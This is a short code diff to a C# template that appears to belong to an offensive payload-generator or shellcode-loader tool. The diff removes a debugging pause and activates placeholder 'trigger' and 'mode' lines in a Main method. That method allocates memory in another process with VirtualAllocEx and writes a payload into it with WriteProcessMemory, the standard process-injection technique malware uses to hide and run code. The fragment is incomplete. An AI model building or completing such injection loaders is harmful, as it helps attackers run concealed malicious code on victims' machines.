@@ -59,7 +59,6 @@
                         catch
                         {
                             Console.WriteLine(""[!] PID Error"");
-                            Console.Read();
                         }
                     }
 
@@ -160,8 +159,8 @@ namespace {{NAMESPACE}}
 	    }
 	    public static void Main(string[] args)
 	    {
-		    //{{TRIGGER}}
-		    //{{MODE}}
+		    {{TRIGGER}}
+		    {{MODE}}
 		    IntPtr lpResult = VirtualAllocEx(proc.Handle,IntPtr.Zero,payload.Length, 0x1000, 0x04); //MEM_COMMIT = 0x1000, RW= 0x04
 		    IntPtr bWritten;
 		    if (WriteProcessMemory(proc.Handle, lpResult, payload, payload.Length, out bWritten))
